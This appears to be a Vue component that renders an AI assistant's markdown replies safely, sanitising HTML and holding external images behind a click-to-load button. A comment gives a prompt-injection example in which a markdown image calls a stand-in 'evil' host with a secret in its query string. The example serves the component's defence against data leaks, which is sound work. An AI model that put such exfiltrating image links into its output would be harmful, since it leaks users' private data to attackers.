<script setup lang="ts">
import { marked } from 'marked'
import DOMPurify from 'isomorphic-dompurify'

const props = defineProps<{ text: string }>()

// Images on other hosts load only on click: a prompt-injected
// ![](https://evil/?q=<secret>) would otherwise leak data the moment the
// reply renders. Data URIs and this app's own paths load as usual.
const GATED = 'oc-img-gated'
if (!(globalThis as { __ocImgHook?: boolean }).__ocImgHook) {
  ;(globalThis as { __ocImgHook?: boolean }).__ocImgHook = true
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName !== 'IMG') return
    const src = node.getAttribute('src') || ''
    if (!/^https?:\/\//i.test(src)) return
    node.removeAttribute('src')
    node.removeAttribute('srcset')
    node.setAttribute('data-src', src)
    node.classList.add(GATED)
  })
}

const html = computed(() => {
  const raw = marked.parse(props.text || '', { async: false, gfm: true, breaks: true }) as string
  return DOMPurify.sanitize(raw, {
    ADD_ATTR: ['target'],
    FORBID_TAGS: ['style', 'form', 'input']
  })
})

const root = ref<HTMLElement>()

/** Swap gated images for a button that names the host before anything loads. */
function gateImages() {
  for (const img of root.value?.querySelectorAll<HTMLImageElement>(`img.${GATED}`) || []) {
    const src = img.dataset.src || ''
    let host = src
    try { host = new URL(src).host } catch { /* keep raw */ }
    const button = document.createElement('button')
    button.type = 'button'
    button.className = 'oc-img-gate'
    button.textContent = `Load image from ${host}${img.alt ? ` · ${img.alt}` : ''}`
    button.title = src
    button.addEventListener('click', () => {
      img.classList.remove(GATED)
      img.src = src
      button.replaceWith(img)
    }, { once: true })
    img.replaceWith(button)
  }
}

watch(html, () => nextTick(gateImages))
onMounted(gateImages)
</script>

<template>
  <div ref="root" class="oc-markdown text-sm" v-html="html" />
</template>
